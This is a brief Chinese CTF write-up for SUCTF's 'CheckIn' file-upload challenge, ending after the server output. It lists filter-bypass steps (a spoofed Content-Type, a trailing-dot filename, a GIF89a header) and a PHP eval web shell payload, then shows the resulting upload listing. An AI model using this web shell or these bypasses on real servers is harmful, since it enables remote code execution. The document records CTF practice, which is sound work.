# suctf

## CheckIn

1. 修改`Content-Type: image/jpeg`, 返回`illegal suffix!`
1. `filename="poc.php."`
1. 文件内容修改为`<script language="php">eval($_POST['cmd']);</script>`
1. 文件头加上`GIF89a`, 返回

    ```
    Your dir uploads/39221d7331e646ec5a9fdc85ba0b89ca <br>Your files : <br>array(4) {
        [0]=>
        string(1) "."
        [1]=>
        string(2) ".."
        [2]=>
        string(9) "index.php"
        [3]=>
        string(8) "poc.php."
    }
    Your dir uploads/39221d7331e646ec5a9fdc85ba0b89ca <br>Your files : <br>array(4) {
        [0]=>
        string(1) "."
        [1]=>
        string(2) ".."
        [2]=>
        string(9) "index.php"
        [3]=>
        string(14) "poc.php%00.jpg"
    }
    ```
